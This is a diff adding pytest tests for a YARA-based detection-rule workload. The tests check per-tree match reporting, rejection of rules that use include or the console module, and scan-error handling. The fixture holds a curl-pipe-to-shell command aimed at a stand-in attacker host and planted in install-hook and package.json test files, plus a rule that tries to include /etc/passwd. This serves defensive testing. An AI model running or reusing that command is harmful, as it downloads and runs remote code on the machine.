@@ -1,4 +1,5 @@
 import io
+import os
 import json
 import pytest
 from numen_runner import workload
@@ -68,3 +69,56 @@ def test_triage_returns_the_raw_reply_without_schema_validation(tmp_path, monkey
     assert "result_json" not in prompt and '"required": ["decision"]' in prompt
     with pytest.raises(ValueError, match="credential material detected"):
         workload.execute(job)
+
+
+RULE = 'rule postinstall_loader { strings: $a = "payload-ran" $b = "evil.example/x" condition: all of them }'
+PAYLOAD = "node -e \"require('fs').writeFileSync('/workspace/outputs/payload-ran','')\" && curl -s https://evil.example/x | sh"
+
+
+def detection_rule(tmp_path, monkeypatch, rule, trees, prepare=lambda root: None):
+    """execute() for a detection_rule job, its rule and trees staged under inputs/ as the engine stages them."""
+    monkeypatch.setattr(workload, "WORK", tmp_path)
+    for path, data in {"rule.yar": rule, **{f"{tree}/{name}": data for tree, files in trees.items() for name, data in files.items()}}.items():
+        (tmp_path / "inputs" / path).parent.mkdir(parents=True, exist_ok=True)
+        (tmp_path / "inputs" / path).write_text(data)
+    prepare(tmp_path / "inputs")
+    return workload.execute({"kind": "detection_rule", "inputs": [], "inputs_materialized": True, "profile": {"agent": "codex"},
+                             "output_schema": {"type": "object"}, "limits": {"input_bytes": 1 << 20, "output_bytes": 1 << 20, "timeout_seconds": 60}})
+
+
+def test_detection_rule_workload_reports_matches_per_tree(tmp_path, monkeypatch):
+    """A07: the real yara reads each tree sent. Paths are relative to their tree, a match list is capped
+    at 1000 files with its full count, a tree that was not sent has no entry, and nothing is written."""
+    many = {f"dist/{n:04}.js": PAYLOAD for n in range(1001)}
+    result = detection_rule(tmp_path, monkeypatch, RULE, {
+        "changed": {"scripts/install hook.sh": PAYLOAD, "README.md": "clean"},
+        "parent": {**many, "README.md": "clean"}})
+    assert result["outputs"] == []
+    report = result["result"]
+    assert (report["compiled"], report["error"], set(report["matches"])) == (True, None, {"changed", "parent"})
+    assert report["matches"]["changed"] == {"files": ["scripts/install hook.sh"], "count": 1}
+    assert report["matches"]["parent"] == {"files": sorted(many)[:1000], "count": 1001}
+
+
+@pytest.mark.parametrize("rule,error", [
+    ("rule broken { condition: ", "syntax error"),
+    ('include "/etc/passwd"\n' + RULE, "include and the console module are not accepted"),
+    ('import "console"\n' + RULE, "include and the console module are not accepted"),
+    # yara accepts a comment before the module name and spells it from \xHH escapes.
+    ('import /* log */ "\\x63ons\\x6fle"\n' + RULE, "include and the console module are not accepted"),
+])
+def test_detection_rule_workload_reports_a_rule_that_does_not_compile(tmp_path, monkeypatch, rule, error):
+    """A rule that does not compile, or that would read other files or print lines a match prints,
+    is reported as not compiled with its error, never raised, and no tree is scanned."""
+    result = detection_rule(tmp_path, monkeypatch, rule, {"changed": {"package.json": PAYLOAD}})
+    assert result["outputs"] == [] and result["result"]["compiled"] is False and "matches" not in result["result"]
+    assert error in result["result"]["error"] and len(result["result"]["error"]) <= 500
+
+
+@pytest.mark.skipif(os.geteuid() == 0, reason="root reads a file whatever its mode")
+def test_a_detection_rule_scan_error_fails_the_run(tmp_path, monkeypatch):
+    """yara reports a file it cannot read on stderr and still exits 0: that must fail the run, never
+    read as 'no match', or a parent or Baseline check could pass falsely."""
+    with pytest.raises(ValueError, match="Detection rule scan failed"):
+        detection_rule(tmp_path, monkeypatch, RULE, {"changed": {"package.json": PAYLOAD}, "parent": {"package.json": PAYLOAD}},
+                       prepare=lambda root: (root / "parent" / "package.json").chmod(0))
